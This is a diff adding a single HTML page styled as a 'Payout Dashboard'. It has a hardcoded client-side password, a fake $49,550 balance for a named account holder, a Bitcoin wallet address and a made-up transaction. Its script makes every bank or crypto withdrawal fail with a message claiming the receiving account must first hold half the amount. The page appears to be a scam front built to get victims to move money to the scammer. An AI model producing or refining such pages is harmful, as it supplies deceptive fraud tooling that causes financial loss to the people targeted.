@@ -1,0 +1,448 @@
+<html><head><base href="/" /><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login - Payout Dashboard</title>
+<style>
+/* Existing styles */
+:root {
+  --primary: #2962ff;
+  --dark: #1a237e;
+  --light: #bbdefb;
+  --success: #00c853;
+}
+
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: 'Segoe UI', system-ui, sans-serif;
+}
+
+body {
+  background: #f5f5f5;
+  min-height: 100vh;
+  padding: 2rem;
+}
+
+/* New login styles */
+.login-container {
+  max-width: 400px;
+  margin: 2rem auto;
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+  padding: 2rem;
+}
+
+.login-logo {
+  text-align: center;
+  margin-bottom: 2rem;
+}
+
+.login-form {
+  display: flex;
+  flex-direction: column;
+  gap: 1rem;
+}
+
+.login-btn {
+  background: var(--primary);
+  color: white;
+  border: none;
+  padding: 1rem;
+  border-radius: 6px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: all 0.3s ease;
+}
+
+.login-btn:hover {
+  background: var(--dark);
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(41,98,255,0.2);
+}
+
+/* Rest of existing styles */
+.dashboard {
+  max-width: 800px;
+  margin: 0 auto;
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+  padding: 2rem;
+}
+
+.user-info {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 2rem;
+}
+
+.avatar {
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  background: var(--light);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.balance-card {
+  background: linear-gradient(135deg, var(--primary), var(--dark));
+  color: white;
+  padding: 2rem;
+  border-radius: 12px;
+  margin-bottom: 2rem;
+}
+
+.balance-amount {
+  font-size: 2.5rem;
+  font-weight: bold;
+  margin: 1rem 0;
+}
+
+.withdraw-section {
+  margin-top: 2rem;
+}
+
+.tabs {
+  display: flex;
+  gap: 1rem;
+  margin-bottom: 2rem;
+}
+
+.tab {
+  padding: 0.75rem 1.5rem;
+  background: #f5f5f5;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+
+.tab.active {
+  background: var(--primary);
+  color: white;
+}
+
+.tab-content {
+  display: none;
+  padding: 1rem;
+  border: 1px solid #eee;
+  border-radius: 8px;
+}
+
+.tab-content.active {
+  display: block;
+}
+
+.input-group {
+  margin-bottom: 1rem;
+}
+
+label {
+  display: block;
+  margin-bottom: 0.5rem;
+  color: #666;
+}
+
+input {
+  width: 100%;
+  padding: 0.75rem;
+  border: 1px solid #ddd;
+  border-radius: 6px;
+  margin-bottom: 1rem;
+}
+
+.withdraw-btn {
+  background: var(--success);
+  color: white;
+  border: none;
+  padding: 1rem 2rem;
+  border-radius: 6px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: all 0.3s ease;
+}
+
+.withdraw-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0,200,83,0.2);
+}
+
+/* New styles for crypto wallet section */
+.crypto-wallet {
+  background: white;
+  border-radius: 8px;
+  padding: 1.5rem;
+  margin-top: 1rem;
+  border: 1px solid #eee;
+}
+
+.wallet-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 1rem;
+}
+
+.wallet-balance {
+  font-size: 1.5rem;
+  font-weight: bold;
+  color: var(--dark);
+}
+
+.wallet-actions {
+  display: flex;
+  gap: 1rem;
+  margin-top: 1rem;
+}
+
+.wallet-btn {
+  flex: 1;
+  padding: 0.75rem;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: all 0.3s ease;
+}
+
+.receive-btn {
+  background: var(--light);
+  color: var(--dark);
+}
+
+.send-btn {
+  background: var(--primary);
+  color: white;
+}
+
+.create-wallet-btn {
+  background: var(--success);
+  color: white;
+  padding: 0.75rem 1.5rem;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: all 0.3s ease;
+  margin-bottom: 1rem;
+}
+
+.wallet-address {
+  font-family: monospace;
+  background: #f5f5f5;
+  padding: 0.5rem;
+  border-radius: 4px;
+  word-break: break-all;
+}
+
+/* Add new styles for transaction history */
+.transaction-history {
+  margin-top: 1rem;
+  padding-top: 1rem;
+  border-top: 1px solid #eee;
+}
+
+.transaction {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 0.5rem 0;
+  color: #666;
+}
+
+.transaction-amount {
+  color: var(--success);
+  font-weight: bold;
+}
+</style>
+</head>
+<body>
+  <!-- Login Container -->
+  <div class="login-container" id="login-section">
+    <div class="login-logo">
+      <svg width="60" height="60" viewBox="0 0 24 24" fill="var(--primary)">
+        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+      </svg>
+      <h1 style="color: var(--primary); margin-top: 1rem;">Payout Dashboard</h1>
+    </div>
+    <form class="login-form" id="login-form">
+      <div class="input-group">
+        <label>Email Address</label>
+        <input type="email" placeholder="Enter your email" required>
+      </div>
+      <div class="input-group">
+        <label>Password</label>
+        <input type="password" placeholder="Enter your password" required>
+      </div>
+      <button type="submit" class="login-btn">Login</button>
+    </form>
+  </div>
+
+  <!-- Dashboard Container (Initially Hidden) -->
+  <div class="dashboard" id="dashboard-section" style="display: none;">
+    <div class="user-info">
+      <div class="avatar">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="white">
+          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+        </svg>
+      </div>
+      <div>
+        <h2>Welcome, Christian Kube</h2>
+        <p style="color: #666;">Account ID: #874392</p>
+      </div>
+    </div>
+
+    <div class="balance-card">
+      <p>Available Balance</p>
+      <div class="balance-amount">$49,550.00</div>
+      <p>Last updated: Today at 12:45 PM</p>
+    </div>
+
+    <div class="withdraw-section">
+      <h3>Withdraw Funds</h3>
+      <div class="tabs">
+        <button class="tab active" data-tab="bank">Bank Account</button>
+        <button class="tab" data-tab="crypto">Cryptocurrency</button>
+        <button class="tab" id="wallet-tab" style="display: none;" data-tab="wallet">Wallet</button>
+      </div>
+
+      <div class="tab-content active" id="bank-content">
+        <div class="input-group">
+          <label>Bank Account Number</label>
+          <input type="text" placeholder="Enter your account number">
+        </div>
+        <div class="input-group">
+          <label>Routing Number</label>
+          <input type="text" placeholder="Enter routing number">
+        </div>
+        <div class="input-group">
+          <label>Amount to Withdraw</label>
+          <input type="number" placeholder="Enter amount">
+        </div>
+        <button class="withdraw-btn">Withdraw to Bank Account</button>
+      </div>
+
+      <div class="tab-content" id="crypto-content">
+        <div class="input-group">
+          <label>Wallet Address</label>
+          <input type="text" placeholder="Enter your wallet address">
+        </div>
+        <div class="input-group">
+          <label>Select Cryptocurrency</label>
+          <select style="width: 100%; padding: 0.75rem; border: 1px solid #ddd; border-radius: 6px; margin-bottom: 1rem;">
+            <option>Bitcoin (BTC)</option>
+            <option>Ethereum (ETH)</option>
+            <option>USDT</option>
+          </select>
+        </div>
+        <div class="input-group">
+          <label>Amount to Withdraw</label>
+          <input type="number" placeholder="Enter amount">
+        </div>
+        <button class="withdraw-btn">Withdraw to Wallet</button>
+      </div>
+
+      <div class="tab-content" id="wallet-content">
+        <div class="crypto-wallet">
+          <div class="wallet-header">
+            <div>
+              <h4>Your Wallet</h4>
+              <div class="wallet-balance">0.055 BTC</div>
+            </div>
+          </div>
+          <div class="wallet-address" id="wallet-address-display">bc1q4za44579rlkesma74gqsqyva473zkzhpwt5c3c</div>
+          <div class="wallet-actions">
+            <button class="wallet-btn receive-btn" id="receive-btn-tab">Receive</button>
+            <button class="wallet-btn send-btn" id="send-btn-tab">Send</button>
+          </div>
+          
+          <div class="transaction-history">
+            <h4>Recent Transactions</h4>
+            <div class="transaction">
+              <span>Received Bitcoin</span>
+              <span class="transaction-amount">+0.055 BTC ($5,000)</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+<script>
+// Login handling
+document.addEventListener('DOMContentLoaded', () => {
+  const loginForm = document.getElementById('login-form');
+  const loginSection = document.getElementById('login-section');
+  const dashboardSection = document.getElementById('dashboard-section');
+
+  loginForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    
+    // Get the password input value
+    const passwordInput = loginForm.querySelector('input[type="password"]');
+    const password = passwordInput.value;
+
+    if (password === '0900620123') {
+      // Correct password - show dashboard
+      loginSection.style.display = 'none';
+      dashboardSection.style.display = 'block';
+    } else {
+      // Wrong password - show error
+      alert('Invalid password. Please try again.');
+      passwordInput.value = ''; // Clear password field
+      passwordInput.focus();
+    }
+  });
+
+  // Tab functionality
+  const tabs = document.querySelectorAll('.tab');
+  const contents = document.querySelectorAll('.tab-content');
+
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
+      contents.forEach(c => c.classList.remove('active'));
+      
+      tab.classList.add('active');
+      const tabContent = document.getElementById(`${tab.dataset.tab}-content`);
+      if (tabContent) {
+        tabContent.classList.add('active');
+      }
+    });
+  });
+
+  // Withdrawal button handlers
+  document.querySelectorAll('.withdraw-btn').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      // Check if this is a bank withdrawal
+      const isBankWithdrawal = e.target.closest('#bank-content');
+      
+      if (isBankWithdrawal) {
+        // Show the specific error message for bank withdrawals
+        alert('Transaction Failed. The requested amount is too large to process at once. The receiving bank account must hold at least half of the withdrawal amount as the current balance.');
+      } else {
+        // Show the specific error message for crypto withdrawals
+        alert('Transaction Failed. The requested amount is too large to process at once. The receiving wallet must hold at least half of the withdrawal amount as the current balance');
+      }
+    });
+  });
+
+  // Add a Bitcoin wallet address
+  const walletAddressDisplay = document.getElementById('wallet-address-display');
+  if (walletAddressDisplay) {
+    walletAddressDisplay.textContent = 'bc1q4za44579rlkesma74gqsqyva473zkzhpwt5c3c';
+  }
+
+  // Wallet tab functionality
+  const walletTab = document.getElementById('wallet-tab');
+  if (walletTab) {
+    walletTab.style.display = 'block';
+  }
+});
+</script>
+</body></html>
